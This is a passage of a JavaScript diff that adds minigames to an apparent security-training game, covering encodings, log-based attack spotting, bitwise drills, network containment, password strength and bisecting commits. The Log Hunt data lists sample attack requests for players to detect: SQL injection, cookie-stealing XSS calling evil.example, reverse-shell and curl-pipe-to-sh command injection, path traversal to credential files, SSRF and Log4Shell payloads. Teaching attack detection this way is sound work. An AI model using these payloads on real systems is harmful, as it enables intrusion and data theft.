+    if(inner==='caesar'){s=caesar(s,pick([1,2,3,4,5,6,7,19,21,23,24]));layers.push('caesar')}else ap(inner);
+    ap(pick(d>=4?['b64','hex','url','dec']:['b64','hex']));if(d>=6)ap(layers[layers.length-1]==='b64'?'hex':'b64');
+    if(d>=8&&layers[layers.length-1]==='b64'&&s.endsWith('='))ap('rev')}
+  return{plain,cipher:s,layers}}
+G.dec={name:'Onion Decoder',tag:'Encodings and ciphers',glyph:'{}',how:'The flag is wrapped in one or more encodings. Recognise the outer layer by how it looks, peel it, and repeat until you can read flag{...}. A decoder that does not fit costs you 4 seconds.',keys:'Click the tools · Z to undo',
+play(d,done){const pz=genDec(d);let cur=pz.cipher,hist=[],errs=0,ops=0,fin=false;const body=frame(this,`${pz.layers.length} layer${pz.layers.length>1?'s':''}`);
+  const TOOLS=[['b64','Base64'],['hex','Hex'],['bin','Binary'],['url','URL'],['dec','Decimal'],['rot13','ROT13'],['atb','Atbash'],['rev','Reverse'],['cm','Caesar −1'],['cp','Caesar +1'],['undo','Undo']];
+  const sniff=s=>{const b=[`${s.length} chars`];if(d>=7)return b[0];if(/^[01 ]+$/.test(s))b.push('only 0, 1 and spaces');else if(/^[\d ]+$/.test(s))b.push('only digits and spaces');else if(/^[0-9a-f]+$/i.test(s))b.push('only 0-9 and a-f');else if(/^(%[0-9a-f]{2})+$/i.test(s))b.push('every character is a % pair');else{if(/^[A-Za-z0-9+/=]+$/.test(s))b.push('letters, digits, + / =');if(s.length%4===0&&/^[A-Za-z0-9+/]+=*$/.test(s))b.push('length is a multiple of 4');if(/[{}]/.test(s))b.push('braces visible')}return b.join(' · ')};
+  body.innerHTML=`<div class="cipher" id="ct"></div><div class="trail" id="trail"></div><div class="tools">${TOOLS.map(([k,l])=>`<button class="btn" data-k="${k}">${l}</button>`).join('')}</div>
+   <p class="hint">Ends in = or mixes upper/lower/digits → Base64 · only 0-9 a-f → hex · only 0 and 1 → binary · %66%6c… → URL · numbers like 102 108 97 → decimal ASCII · }…{ backwards → reversed · synt{ → ROT13 · uozt{ → Atbash · other scrambled letters → a Caesar shift</p>`;
+  const t=startTimer(26+pz.layers.length*15+(pz.layers.includes('caesar')?12:0),()=>end(false));
+  const end=once(ok=>{fin=true;t.stop();if(ok&&pz.layers.length>=3)award('onion');
+    done({win:ok,mistakes:Math.min(errs,3),perfect:ok&&errs===0,frac:t.frac(),learn:[...new Set(pz.layers.map(l=>({b64:'base64',hex:'hexenc',rot13:'caesar',caesar:'caesar',rev:'layers',bin:'binary',url:'urlenc',dec:'ascii',atb:'atbash'}[l])).concat(pz.layers.length>1?['layers']:[]))],note:ok?'':`It was ${pz.plain}`,game:'dec'})});
+  const draw=()=>{$('#ct').textContent=cur;$('#trail').textContent=(hist.length?`${hist.length} step${hist.length>1?'s':''} applied`:'Untouched ciphertext')+' · '+sniff(cur)};
+  function op(k){if(fin)return;if(k==='undo'){if(hist.length){cur=hist.pop();sfx.click();draw()}return}
+    const out=DEC[k](cur);if(out==null){errs++;sfx.bad();t.hit(4);const c=$('#ct');c.classList.remove('err');void c.offsetWidth;c.classList.add('err');return}
+    hist.push(cur);cur=out;ops++;sfx.click();draw();if(cur===pz.plain){fin=true;$('#ct').classList.add('done');sfx.ok();t.paused=true;later(()=>end(true),700)}}
+  $$('.tools .btn').forEach(b=>b.onclick=()=>op(b.dataset.k));keyFn=e=>{if(e.key.toLowerCase()==='z'){op('undo');return true}};draw()}};
+
+/* ---- 4. Log Hunt ---- */
+const ATT={sqli:{n:'SQL injection',p:["/products?id=12' OR '1'='1'--","/login?user=admin'--&pass=x","/items?cat=3 UNION SELECT username,password FROM users--","/api/orders?sort=id;DROP TABLE orders--","/account?id=7 OR 1=1"]},
+  xss:{n:'Cross-site scripting',p:["/search?q=<script>fetch('//evil.example/c?'+document.cookie)<\/script>","/profile?name=<img src=x onerror=alert(document.domain)>","/comment?text=<svg onload=fetch('//evil.example/'+localStorage.token)>"]},
+  trav:{n:'Path traversal',p:['/download?file=../../../../etc/passwd','/static/..%2f..%2f..%2fetc/shadow','/view?page=....//....//....//etc/passwd','/img?name=..\\..\\..\\windows\\win.ini']},
+  cmdi:{n:'Command injection',p:['/tools/ping?host=8.8.8.8;cat /etc/passwd','/api/convert?file=a.png|nc 198.51.100.9 4444 -e /bin/sh','/api/dns?name=example.com&&curl evil.example/x.sh|sh','/report?fmt=pdf$(whoami)']},
+  recon:{n:'Reconnaissance probe',p:['/.env','/.git/config','/backup.sql','/wp-admin/setup-config.php','/phpinfo.php','/server-status','/.aws/credentials','/config.php.bak']},
+  ssrf:{n:'Server-side request forgery',p:['/fetch?url=http://169.254.169.254/latest/meta-data/iam/','/preview?url=http://localhost:6379/','/api/import?src=http://10.0.0.5:8500/v1/kv/']},
+  jndi:{n:'Log4Shell (JNDI injection)',p:['/search?q=${jndi:ldap://evil.example/a}','/login?user=${jndi:rmi://198.51.100.9:1099/x}']},
+  webshell:{n:'Web shell',p:['/uploads/shell.php?cmd=id','/images/avatar.php?c=whoami','/uploads/x.jsp?exec=cat+/etc/passwd']},
+  enum:{n:'ID enumeration',p:[]},
+  brute:{n:'Brute-force login',p:[]}};
+const BENIGN=[['GET','/',200],['GET','/products?id=42',200],['GET','/search?q=running+shoes',200],['POST','/api/cart',201],['GET','/static/app.js',200],['GET','/about',200],['GET','/images/logo.png',304],['GET','/favicon.ico',404],['POST','/login',302],['GET','/account/orders',200],['GET','/products?id=7&sort=price',200],['GET','/api/stock?sku=A-1193',200],['POST','/checkout',200],['GET','/blog/spring-sale',200],['GET','/api/user/me',200],['GET','/static/styles.css',200],['POST','/api/newsletter',204],['GET','/products?id=118&color=blue',200],['GET','/robots.txt',200],['GET','/help/returns',200],['PUT','/api/cart/3',200],['GET','/search?q=usb-c+cable',200]];
+const DECOY=[['GET','/search?q=select+a+plan',200],['GET','/blog/union-square-store-opening',200],['GET','/docs/scripting-guide.html',200],['GET','/search?q=drop+shipping',200],['GET','/fetch?url=https://cdn.helixcorp.com/logo.png',200],['GET','/files/report-final(2).pdf',200],['GET',"/search?q=o'reilly+books",200],['GET','/products?id=12&ref=union',200],['GET','/download?file=report..final.pdf',200],['GET','/docs/etc-passwd-explained',200]];
+function genLog(d){const kinds=shuffle(Object.keys(ATT)).slice(0,d>=6?2:1);let lines=[];const ipg=()=>`${pick([73,86,98,104,151,176])}.${ri(1,254)}.${ri(1,254)}.${ri(1,254)}`;
+  shuffle(BENIGN).slice(0,6+Math.min(5,Math.floor(d))).forEach(b=>lines.push({ip:ipg(),m:b[0],p:b[1],st:b[2],bad:null}));
+  if(d>=3)lines.push({ip:ipg(),m:'POST',p:'/login',st:401,bad:null});
+  if(d>=4)shuffle(DECOY).slice(0,d>=7?2:1).forEach(b=>lines.push({ip:ipg(),m:b[0],p:b[1],st:b[2],bad:null}));
+  lines=shuffle(lines);
+  kinds.forEach(k=>{const ip=`${pick([45,185,193,212])}.${ri(1,254)}.${ri(1,254)}.${ri(1,254)}`,pos=ri(0,lines.length);
+    if(k==='brute'){const blk=[];for(let j=0;j<5;j++)blk.push({ip,m:'POST',p:'/login',st:401,bad:k});blk.push({ip,m:'POST',p:'/login',st:200,bad:k});lines.splice(pos,0,...blk)}
+    else if(k==='enum'){const base=ri(1000,8000),blk=[];for(let j=0;j<6;j++)blk.push({ip,m:'GET',p:`/api/users/${base+j}/profile`,st:pick([200,200,403]),bad:k});lines.splice(pos,0,...blk)}
+    else lines.splice(pos,0,{ip,m:'GET',p:pick(ATT[k].p),st:k==='recon'?pick([404,200]):pick([200,500,403]),bad:k})});
+  let tt=ri(3600,80000);lines.forEach(l=>{tt+=l.bad==='brute'||l.bad==='enum'?1:ri(2,45);l.t=[tt/3600%24,tt/60%60,tt%60].map(x=>String(Math.floor(x)).padStart(2,'0')).join(':')});
+  return{lines,kinds}}
+G.logs={name:'Log Hunt',tag:'Attack detection',glyph:'>_',how:'A web server log scrolls past. Click the request that is an attack. For a burst of requests from one source, any line in the burst counts. From difficulty 3 you also have to name the attack you found. Two mistakes are allowed.',keys:'Click or tap a log line · keys 1-4 name the attack',
+play(d,done){const rounds=2,cls=d>=3;let r=0,miss=0,pz,found,asking=false;const seen=new Set();const body=frame(this);
+  const t=startTimer(rounds*((d>=6?44:30)+(cls?8:0)),()=>end(false,'Out of time'));
+  const end=once((ok,note)=>{t.stop();done({win:ok&&miss<=2,mistakes:miss,perfect:ok&&miss===0,frac:t.frac(),learn:[...seen],note:note||(miss>2?'Too many mistakes':''),game:'logs'})});
+  function render(){asking=false;pz=genLog(d);dbg(pz);found=new Set();$('#gprog').textContent=`Log ${r+1} / ${rounds} · ${pz.kinds.length} attack${pz.kinds.length>1?'s':''} hidden`;
+    body.innerHTML=`<div class="logs">${pz.lines.map((l,j)=>`<button class="logline" data-j="${j}"><span class="t">${l.t}</span><span class="ip">${l.ip}</span><span>${l.m}</span><span class="p">${esc(l.p)}</span><span>${l.st}</span></button>`).join('')}</div><div id="fb"></div>`;
+    $$('.logline').forEach(b=>b.onclick=()=>clickLine(+b.dataset.j,b))}
+  function clickLine(j,b){if(asking)return;const l=pz.lines[j];if(!l.bad){miss++;sfx.bad();t.hit(4);b.classList.add('wrong');if(miss>2)end(false);return}
+    if(found.has(l.bad))return;found.add(l.bad);seen.add(l.bad);sfx.ok();pz.lines.forEach((x,i)=>{if(x.bad===l.bad)$(`.logline[data-j="${i}"]`).classList.add('found')});
+    cls?ask(l.bad,l):after(true)}
+  function ask(k,l){asking=true;const os=shuffle([k,...shuffle(Object.keys(ATT).filter(x=>x!==k)).slice(0,3)]),fb=$('#fb');
+    fb.innerHTML=`<p class="keys" style="color:var(--text)">Good catch. What kind of attack is it?</p><div class="href"><code>${k==='brute'?'POST /login ×6 from '+l.ip+', one second apart':k==='enum'?esc(l.p)+' and five neighbours from '+l.ip:esc(l.m+' '+l.p)}</code></div><div class="opts">${os.map((o,q)=>`<button class="btn" data-k="${o}"><span class="mono" style="color:var(--dim)">${q+1}</span>&nbsp; ${ATT[o].n}</button>`).join('')}</div>`;
+    try{fb.scrollIntoView({block:'nearest',behavior:reduced?'auto':'smooth'})}catch(e){}
+    const pickA=o=>{if(!asking)return;asking=false;keyFn=null;if(o===k)sfx.ok();else{miss++;sfx.bad();t.hit(3);if(miss>2)return end(false,`Too many mistakes. That one was ${ATT[k].n}`)}after(o===k)};
+    $$('.opts .btn',fb).forEach(b=>b.onclick=()=>pickA(b.dataset.k));keyFn=e=>{const q=+e.key-1;if(q>=0&&q<os.length){pickA(os[q]);return true}}}
+  function after(right){if(found.size<pz.kinds.length){$('#fb').innerHTML=`<p class="hint">${right?'':'Not that kind: the debrief will explain. '}One more attack is hiding in this log.</p>`;return}
+    t.paused=true;verdict($('#fb'),right,' '+pz.kinds.map(k=>`<b style="color:var(--violet)">${ATT[k].n}.</b> ${esc(CODEX[k][1])}`).join('<br>'),()=>{t.paused=false;r++;if(r>=rounds)return end(true);render()})}
+  render()}};
+
+/* ---- 5. Bit Flip ---- */
+const bin8=v=>v.toString(2).padStart(8,'0').replace(/(.{4})/,'$1 ');
+function genBit(d){const types=['dec'];if(d>=3)types.push('hex');if(d>=5)types.push('and','or','xor');if(d>=4)types.push('ascii');if(d>=7)types.push('not','shl','shr','mask','mask','twos');
+  const ty=pick(types),max=d<=2?31:d<=4?127:255;let v,a=ri(1,255),b=ri(1,255),big,sub,k='bits';
+  if(ty==='dec'){v=ri(d<=2?3:16,max);big=v;sub='Set the bits that add up to this number'}
+  else if(ty==='hex'){v=ri(16,255);big='0x'+v.toString(16).toUpperCase().padStart(2,'0');sub='Each hex digit is four bits';k='hexnum'}
+  else if(ty==='mask'){const n=ri(25,30);v=256-2**(32-n);big='/'+n;sub='Last octet of this subnet mask';k='subnetmask'}
+  else if(ty==='ascii'){const ch=pick('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.split(''));v=ch.charCodeAt(0);big=`'${ch}'`;sub='ASCII code of this character · A = 65 · a = 97 · 0 = 48';k='ascii'}
+  else if(ty==='twos'){const m=ri(1,100);v=256-m;big='−'+m;sub=`Two's complement: write ${m}, flip every bit, add 1`;k='twos'}
+  else if(ty==='shr'){a=ri(2,255);v=a>>1;big=bin8(a)+' >> 1';sub='Shift right by one (halves the value, drops the last bit)';k='bitwise'}
+  else if(ty==='not'){a=ri(1,254);v=~a&255;big='NOT '+bin8(a);sub='Flip every bit';k='bitwise'}
+  else if(ty==='shl'){a=ri(1,127);v=a<<1&255;big=bin8(a)+' << 1';sub='Shift left by one (doubles the value)';k='bitwise'}
+  else{do{a=ri(1,255);b=ri(1,255);v=ty==='and'?a&b:ty==='or'?a|b:a^b}while(v===0||v===a&&ty!=='xor'&&rnd()<.8);big=`${bin8(a)}<br>${ty.toUpperCase()} ${bin8(b)}`;sub={and:'1 only where both are 1',or:'1 where either is 1',xor:'1 where they differ'}[ty];k='bitwise'}
+  return{v,big,sub,k}}
+G.bits={name:'Bit Flip',tag:'Binary and hex',glyph:'01',how:'Flip the eight switches until the byte matches the target. It locks in the moment you are right, so go fast.',keys:'Keys 1-8 flip bits left to right',
+play(d,done){const n=Math.min(8,4+Math.floor(d/3));let i=0,val=0,pz,busy=false;const seen=new Set(['bits']);const body=frame(this);
+  const t=startTimer(n*Math.max(6.5,11-d*.45),()=>end(false));
+  const end=once(ok=>{t.stop();done({win:ok,mistakes:0,perfect:ok&&t.frac()>.4,frac:t.frac(),learn:[...seen],note:ok?'':'Out of time',game:'bits'})});
+  function render(){busy=false;val=0;pz=genBit(d);seen.add(pz.k);$('#gprog').textContent=`Byte ${i+1} / ${n}`;
+    body.innerHTML=`<div class="target"><div class="lab">${pz.sub}</div><div class="big">${pz.big}</div></div><div class="bits" id="bits">${[128,64,32,16,8,4,2,1].map((p,j)=>`<button class="bit" data-j="${j}"><b>0</b><small>${p}</small></button>`).join('')}</div><div class="cur" id="curv"></div>`;
+    $$('.bit').forEach(b=>b.onclick=()=>flip(+b.dataset.j));upd()}
+  function upd(){$$('.bit').forEach((b,j)=>{const on=val>>(7-j)&1;b.classList.toggle('on',!!on);b.firstChild.textContent=on});$('#curv').textContent=d<5?`current value: ${val}  (0x${val.toString(16).toUpperCase().padStart(2,'0')})`:'value hidden at this difficulty'}
+  function flip(j){if(busy)return;val^=1<<(7-j);sfx.click();upd();if(val===pz.v){busy=true;sfx.ok();$('#bits').classList.add('solved');later(()=>{i++;if(i>=n)return end(true);render()},320)}}
+  keyFn=e=>{if(e.key>='1'&&e.key<='8'){flip(+e.key-1);return true}};render()}};
+
+/* ---- 6. Leaky Lock ---- */
+G.lock={name:'Leaky Lock',tag:'Side channels',glyph:'**',how:'This lock has a flaw: after every guess it leaks which symbols were right. Green is the right symbol in the right place, amber is in the code but elsewhere. No symbol repeats in the code. Watch the count of codes that still fit: a good guess makes it collapse.',keys:'Type the symbols · Enter to submit · Backspace to delete',
+play(d,done){const L=d>=5?5:4,hex=d>=7,alpha=(hex?'0123456789ABCDEF':'0123456789').split(''),maxG=hex?10:7;
+  const code=shuffle(alpha).slice(0,L);let rows=[],cur=[],fin=false,remain=1;for(let q=0;q<L;q++)remain*=alpha.length-q;const know={};const body=frame(this);
+  const fbOf=(x,g)=>g.map((c,i)=>c===x[i]?'g':x.includes(c)?'y':'n');
+  function fits(){const out=new Set();rows.forEach(r=>r.g.forEach((c,i)=>{if(r.fb[i]==='n')out.add(c)}));const pool=alpha.filter(a=>!out.has(a)),x=[];let cnt=0;
+    (function rec(i){if(i===L){if(rows.every(r=>fbOf(x,r.g).every((f,q)=>f===r.fb[q])))cnt++;return}for(const c of pool){if(x.includes(c))continue;if(rows.some(r=>(r.fb[i]==='g')!==(r.g[i]===c)))continue;x[i]=c;rec(i+1);x.length=i}})(0);return Math.max(1,cnt)}
+  const t=startTimer(75+(L-4)*15+(hex?30:0),()=>end(false));
+  const end=once(ok=>{fin=true;t.stop();if(ok&&rows.length<=3)award('lucky');done({win:ok,mistakes:0,perfect:ok&&rows.length<=4,frac:t.frac(),learn:['sidechannel','lockout','infotheory'],note:ok?`Cracked in ${rows.length} guess${rows.length>1?'es':''}`:`Locked out. The code was ${code.join('')}`,game:'lock'})});
+  function draw(){$('#gprog').textContent=`Guess ${Math.min(rows.length+1,maxG)} / ${maxG}`;let h='<div class="grid">';
+    for(let r=0;r<maxG;r++){h+='<div class="grow'+(r>rows.length?' fut':'')+'">';for(let c=0;c<L;c++){if(r<rows.length)h+=`<div class="cell ${rows[r].fb[c]}">${rows[r].g[c]}</div>`;else if(r===rows.length)h+=`<div class="cell ${c===cur.length?'cur':''}">${cur[c]||''}</div>`;else h+='<div class="cell"></div>'}h+='</div>'}
+    h+=`</div><p class="cur">${remain===1?'Only one code still fits the leaks':`${remain.toLocaleString()} codes still fit the leaks · ${Math.log2(remain).toFixed(1)} bits left`}</p><div class="pad">${alpha.map(a=>`<button class="btn ${know[a]||''}" data-k="${a}">${a}</button>`).join('')}<button class="btn wide2" data-k="del">Delete</button><button class="btn primary wide2" data-k="ent">Enter</button></div>`;
+    body.innerHTML=h;const gr=$('.grid');if(gr)gr.scrollTop=gr.scrollHeight;$$('.pad .btn').forEach(b=>b.onclick=()=>press(b.dataset.k))}
+  function press(k){if(fin)return;if(k==='del')cur.pop();else if(k==='ent'){if(cur.length===L)return submit()}else if(cur.length<L){cur.push(k);sfx.click()}draw()}
+  function submit(){const fb=cur.map((c,i)=>c===code[i]?'g':code.includes(c)?'y':'n');cur.forEach((c,i)=>{if(know[c]!=='g')know[c]=fb[i]});rows.push({g:cur,fb});cur=[];remain=fits();draw();
+    if(fb.every(x=>x==='g')){fin=true;sfx.ok();t.paused=true;later(()=>end(true),600)}else if(rows.length>=maxG){fin=true;sfx.bad();later(()=>end(false),700)}else sfx.click()}
+  keyFn=e=>{const k=e.key.toUpperCase();if(alpha.includes(k)){press(k);return true}if(e.key==='Backspace'){press('del');return true}if(e.key==='Enter'){press('ent');return true}};draw()}};
+
+/* ---- 8. Quarantine ---- */
+function reach(adj,from,tgt,blk){const seen=new Set(from),q=[...from];while(q.length){const a=q.shift();if(a===tgt)return true;for(const b of adj[a])if(!seen.has(b)&&!blk.has(b)){seen.add(b);q.push(b)}}return false}
+function minCut(adj,s,t,N){if(!reach(adj,[s],t,new Set()))return 0;if(adj[s].has(t))return 99;const ids=[];for(let i=0;i<N;i++)if(i!==s&&i!==t&&adj[i].size)ids.push(i);const n=ids.length;
+  for(let a=0;a<n;a++)if(!reach(adj,[s],t,new Set([ids[a]])))return 1;
+  for(let a=0;a<n;a++)for(let b=a+1;b<n;b++)if(!reach(adj,[s],t,new Set([ids[a],ids[b]])))return 2;
+  for(let a=0;a<n;a++)for(let b=a+1;b<n;b++)for(let c=b+1;c<n;c++)if(!reach(adj,[s],t,new Set([ids[a],ids[b],ids[c]])))return 3;return 99}
+function cutSet(adj,s,t,N,k){const ids=[];for(let i=0;i<N;i++)if(i!==s&&i!==t&&adj[i].size)ids.push(i);const n=ids.length,ok=a=>!reach(adj,[s],t,new Set(a));
+  if(k===1){for(const a of ids)if(ok([a]))return[a]}
+  if(k===2){for(let a=0;a<n;a++)for(let b=a+1;b<n;b++)if(ok([ids[a],ids[b]]))return[ids[a],ids[b]]}
+  if(k===3){for(let a=0;a<n;a++)for(let b=a+1;b<n;b++)for(let c=b+1;c<n;c++)if(ok([ids[a],ids[b],ids[c]]))return[ids[a],ids[b],ids[c]]}return[]}
+function genNet(d){const cols=d<4?4:5,rows=d<7?3:4,N=cols*rows,want=d<3?1:d<6?2:3;for(;;){const adj=Array.from({length:N},()=>new Set()),link=(a,b)=>{adj[a].add(b);adj[b].add(a)};
+  for(let r=0;r<rows;r++)for(let c=0;c<cols;c++){const i=r*cols+c;if(c<cols-1&&rnd()<(d>=6?.86:.75))link(i,i+1);if(r<rows-1&&rnd()<(d>=6?.72:.55))link(i,i+cols);if(c<cols-1&&r<rows-1){const x=rnd();if(x<.2)link(i,i+cols+1);else if(x<.4)link(i+1,i+cols)}}
+  const src=ri(0,rows-1)*cols,tgt=ri(0,rows-1)*cols+cols-1,k=minCut(adj,src,tgt,N);
+  if(k>=Math.max(1,want-1)&&k<=want)return{cols,rows,N,adj,src,tgt,k}}}
+G.quar={name:'Quarantine',tag:'Network containment',glyph:'<>',how:'Malware spreads one hop at a time toward the database. Click hosts to pull them off the network and cut every path before it arrives. You only get a few quarantines, so look for the choke points every path must cross.',keys:'Click or tap a host · the red bar shows time until the next spread',
+play(d,done){const rounds=2,T=Math.max(1.7,3.6-d*.22);let r=0,net,inf,blk,left,used=0,ru=0,opt=0,over=false,busy=false,nextAt=0,curT=T;const body=frame(this);
+  const showOpt=()=>cutSet(net.adj,net.src,net.tgt,net.N,net.k).forEach(i=>{const g=$(`.nd[data-i="${i}"]`);if(g)g.classList.add('opt')});
+  const t=startTimer(rounds*T*8.5,()=>end(false,'Out of time'));const el=()=>t.tot-t.left;
+  const end=once((ok,note)=>{over=true;t.stop();if(ok&&used<=opt)award('clean');done({win:ok,mistakes:0,perfect:ok&&used<=opt,frac:t.frac(),learn:['segment','graph'],note:note||(ok?(used<=opt?'Minimum cut found':`Contained with ${used} quarantines; ${opt} would have done it`):''),game:'quar'})});
+  function setup(){busy=false;ru=0;net=genNet(d);dbg(net);inf=new Set([net.src]);blk=new Set();left=net.k+1;opt+=net.k;curT=T*1.7;nextAt=el()+curT;draw()}
+  function draw(){const{cols,adj,tgt}=net,px=i=>70+(i%cols)*115,py=i=>50+Math.floor(i/cols)*85,W=115*(cols-1)+140,H=85*(net.rows-1)+100;
+    $('#gprog').textContent=`Network ${r+1} / ${rounds} · ${left} quarantine${left===1?'':'s'} left`;
+    let s=`<svg class="net" viewBox="0 0 ${W} ${H}" role="group" aria-label="Network map">`;
+    for(let i=0;i<net.N;i++)for(const j of adj[i])if(j>i){const cut=blk.has(i)||blk.has(j),a=inf.has(i),b=inf.has(j);s+=`<line x1="${px(i)}" y1="${py(i)}" x2="${px(j)}" y2="${py(j)}" class="${cut?'cut':a!==b?'hot':a&&b?'dead':''}"/>`}
+    for(let i=0;i<net.N;i++){if(!adj[i].size)continue;const c=inf.has(i)?'inf':blk.has(i)?'blk':i===tgt?'tgt':'';s+=`<g class="nd ${c}" data-i="${i}"><circle class="hitc" cx="${px(i)}" cy="${py(i)}" r="40"/><circle cx="${px(i)}" cy="${py(i)}" r="25"/><text x="${px(i)}" y="${py(i)+5}">${inf.has(i)?'!!':blk.has(i)?'×':i===tgt?'DB':'PC'}</text></g>`}
+    body.innerHTML=`<div class="spread"><i id="spr"></i></div>${s}</svg><div id="fb"></div><p class="hint">Red is infected, amber DB is what you are protecting. A quarantined host blocks everything that would pass through it.</p>`;
+    $$('.nd').forEach(g=>g.onclick=()=>cut(+g.dataset.i))}
+  function cut(i){if(over||busy||left<=0||inf.has(i)||blk.has(i)||i===net.tgt)return;blk.add(i);left--;used++;ru++;sfx.click();
+    if(!reach(net.adj,[...inf],net.tgt,blk)){busy=true;sfx.ok();t.paused=true;draw();const extra=ru>net.k;if(extra)showOpt();$('#fb').innerHTML=extra?`<p class="chip amber">Contained, but ${net.k} quarantine${net.k>1?'s':''} would have done it: see the ringed host${net.k>1?'s':''}</p>`:'<p class="chip green">Contained with the minimum cut</p>';later(()=>{t.paused=false;r++;if(r>=rounds)return end(true);setup()},extra?2100:850);return}
+    draw()}
+  function spread(){const add=[];inf.forEach(a=>net.adj[a].forEach(b=>{if(!inf.has(b)&&!blk.has(b))add.push(b)}));add.forEach(b=>inf.add(b));tone(220,.08,'sawtooth',.04);
+    if(inf.has(net.tgt)){busy=true;draw();showOpt();$('#fb').innerHTML='<p class="chip red">Breached. The ringed hosts were the choke point.</p>';sfx.bad();later(()=>end(false,'The database was infected'),1900);return}
+    curT=left>0?T:.45;nextAt=el()+curT;draw()}
+  every(()=>{if(over||busy||t.hold||t.paused)return;const e=el(),sp=$('#spr');if(sp)sp.style.transform=`scaleX(${Math.max(0,Math.min(1,(nextAt-e)/curT))})`;if(e>=nextAt)spread()},60);
+  setup()}};
+
+/* ---- 9. Crack Order ---- */
+const PWW=['copper','violin','marsh','eleven','orbit','walnut','signal','harbor','pepper','glacier','ribbon','falcon','candle','meadow','tunnel','quartz'];
+const PCS='abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!#$%&*?';
+const randStr=n=>Array.from({length:n},()=>PCS[ri(0,PCS.length-1)]).join('');
+const PWT=[
+ {g:()=>pick(['123456','password','qwerty','iloveyou','letmein','admin','abc123','111111','qwertyuiop','1q2w3e4r','aaaaaaaa','dragon','football','12345678','000000','asdfghjkl']),t:'instantly',w:'It sits on every leaked-password list, and those are tried first.'},
+ {g:()=>pick(['Summer2026','P@ssw0rd!','Dragon123','Welcome1!','Liverpool99','Password123456!','Qwerty!2026','Monkey#1','Tr0ub4dor&3','S3cur1ty!','Chelsea2026!','Emma2015!','Winter#2025','Admin@123','L3tm31n!!']),t:'in seconds',w:'A dictionary word with predictable tweaks. Cracking tools apply those tweaks automatically.'},
+ {g:()=>randStr(6),t:'in under an hour',w:'Truly random, but six characters is far too short.'},
+ {g:()=>shuffle(PWW).slice(0,4).join(pick(['-','.',' ','_'])),t:'in years',w:'Four random words from a big list: strong, and you can remember it.'},
+ {g:()=>randStr(12),t:'in millions of years',w:'Twelve random characters, about 75 bits of entropy.'},
+ {g:()=>randStr(20),t:'long after the sun burns out',w:'Twenty random characters: what a password manager generates.'}];
+G.pw={name:'Crack Order',tag:'Password strength',glyph:'pw',how:'An attacker has stolen the password database. Tap the passwords in the order they would fall, weakest first. Length and randomness matter more than symbols. Two wrong taps are allowed.',keys:'Click, tap, or press 1-5 (top to bottom) in order',
+play(d,done){const rounds=3,n=d<4?3:d<7?4:5;let r=0,miss=0,items,rank;const body=frame(this);
+  const t=startTimer(rounds*(9+n*3.5)-Math.min(8,d),()=>end(false,'Out of time'));
+  const end=once((ok,note)=>{t.stop();done({win:ok&&miss<=2,mistakes:miss,perfect:ok&&miss===0,frac:t.frac(),learn:['entropy','dictionary'],note:note||(miss>2?'Too many wrong picks':''),game:'pw'})});
+  function render(){items=shuffle(shuffle([0,1,2,3,4,5]).slice(0,n).map(k=>({k,pw:PWT[k].g(),done:false})));rank=0;$('#gprog').textContent=`Set ${r+1} / ${rounds}`;
+    body.innerHTML=`<p class="q">Which falls first? Tap weakest to strongest.</p><div class="pwlist">${items.map((it,j)=>`<button class="btn" data-j="${j}"><span class="rk"></span><span>${esc(it.pw)}</span></button>`).join('')}</div><div id="fb"></div><p class="hint">Assume offline guessing against a fast hash: billions of tries per second.</p>`;
+    $$('.pwlist .btn').forEach(b=>b.onclick=()=>tap(+b.dataset.j,b));keyFn=e=>{const j=+e.key-1;if(j>=0&&j<n){tap(j,$$('.pwlist .btn')[j]);return true}}}
+  function mark(j){const it=items[j];it.done=true;rank++;const b=$(`.pwlist .btn[data-j="${j}"]`);b.classList.add('lockd');b.firstChild.textContent=rank}
+  function tap(j,b){const it=items[j];if(it.done||rank>=n)return;const weakest=Math.min(...items.filter(x=>!x.done).map(x=>x.k));
+    if(it.k!==weakest){miss++;sfx.bad();t.hit(3);b.classList.remove('nope');void b.offsetWidth;b.classList.add('nope');if(miss>2)end(false);return}
+    mark(j);sfx.click();if(rank<n-1)return;mark(items.findIndex(x=>!x.done));t.paused=true;sfx.ok();
+    verdict($('#fb'),true,items.slice().sort((a,b)=>a.k-b.k).map(x=>`<br><code>${esc(x.pw)}</code> falls ${PWT[x.k].t}. ${PWT[x.k].w}`).join(''),()=>{t.paused=false;r++;if(r>=rounds)return end(true);render()})}
+  render()}};
+
+/* ---- 10. Bisect ---- */
+G.bis={name:'Bisect',tag:'Binary search',glyph:'/2',how:'One commit slipped a backdoor into the codebase, and every commit after it is tainted too. Test a commit to learn whether it is clean or tainted. You only get a handful of tests, so halve the suspects every time.',keys:'Click or tap a commit to test it',
+play(d,done){const rounds=2,N=d<3?16:d<6?32:d<8||innerWidth<560?64:128,opt=Math.ceil(Math.log2(N-1)),budget=opt+(d<5?2:1),cols=N<=16||(innerWidth<560&&N<=64)?8:16;let r=0,bad,lo,hi,left,used=0,busy=false;const body=frame(this);
+  const t=startTimer(rounds*(14+opt*3.2),()=>end(false,'Out of time'));
+  const end=once((ok,note)=>{t.stop();if(ok&&used<=rounds*opt)award('logn');done({win:ok,mistakes:0,perfect:ok&&used<=rounds*opt,frac:t.frac(),learn:['bsearch'],note:note||'',game:'bis'})});
+  function setup(){busy=false;bad=ri(1,N-1);lo=0;hi=N-1;left=budget;draw()}
+  function draw(){$('#gprog').textContent=`Repo ${r+1} / ${rounds} · ${left} test${left===1?'':'s'} left`;let h='';
+    for(let i=0;i<N;i++)h+=`<button data-i="${i}" class="${i<=lo?'ok':i>=hi?'bad':''}" aria-label="commit ${i}">${N<=32?i:''}</button>`;
+    body.innerHTML=`<p class="q">The first tainted commit is one of ${hi-lo}.</p><div class="axis"><span>oldest · known clean</span><span>newest · known tainted</span></div><div class="commits" style="grid-template-columns:repeat(${cols},minmax(0,1fr))">${h}</div><div id="fb"></div><p class="hint">Green is known clean, red is known tainted. ${N} commits can always be solved in ${opt} tests.</p>`;
+    $$('.commits button').forEach(b=>b.onclick=()=>test(+b.dataset.i))}
+  function test(i){if(busy||i<=lo||i>=hi)return;const before=hi-lo;left--;used++;if(i>=bad){hi=i;tone(200,.08,'sawtooth',.04)}else{lo=i;tone(700,.06,'triangle',.04)}
+    if(hi-lo===1){busy=true;draw();$(`.commits button[data-i="${bad}"]`).classList.add('hit');sfx.ok();t.paused=true;
